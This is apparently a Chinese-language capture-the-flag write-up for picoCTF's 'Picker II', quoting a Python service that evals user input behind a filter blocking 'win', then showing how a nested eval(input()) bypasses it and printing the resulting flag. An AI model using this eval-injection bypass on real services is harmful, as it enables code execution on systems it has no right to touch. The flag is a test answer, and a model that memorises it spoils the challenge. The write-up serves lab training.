---
icon: pen-to-square
date: 2025-01-13
tags: 
title: Picker II
category:
  - 领域
---
5,279 users solved
#### Description
Can you figure out how this program works to get the flag?

Additional details will be available after launching your challenge instance.
#### Hints
Can you do what `win` does with your input to the program?

---
# 00. 前言
值得一提的是本题的好评率达到了97%，没错，本题确实相当有趣，如果你是为了寻找wp，我建议你自己研究一下

# 01. 解题过程
```python
while(True):  
  try:  
    user_input = input('==> ')  
    if( filter(user_input) ):  
      eval(user_input + '()')  
    else:  
      print('Illegal input')  
  except Exception as e:  
    print(e)  
    break
```
这是主程序，关键调用了filter()验证玩家输入，然后执行玩家输入的语句并接上一个()
检验部分：
```python
def filter(user_input):  
  if 'win' in user_input:  
    return False  
  return True
```
我的思路是继续接接上一个eval
```
eval(input())
```
然后会让我们输入，这时已经调用了检验函数，我们只需输入win即可执行win()函数

获得flag的hex形式
```bash
└─# nc saturn.picoctf.net 62159
==> eval(input())
win()
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x66 0x31 0x6c 0x37 0x33 0x72 0x35 0x5f 0x66 0x34 0x31 0x6c 0x5f 0x63 0x30 0x64 0x33 0x5f 0x72 0x33 0x66 0x34 0x63 0x37 0x30 0x72 0x5f 0x6d 0x31 0x67 0x68 0x37 0x5f 0x35 0x75 0x63 0x63 0x33 0x33 0x64 0x5f 0x30 0x62 0x35 0x66 0x31 0x31 0x33 0x31 0x7d
'NoneType' object is not callable
```
flag:
```
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131}
```
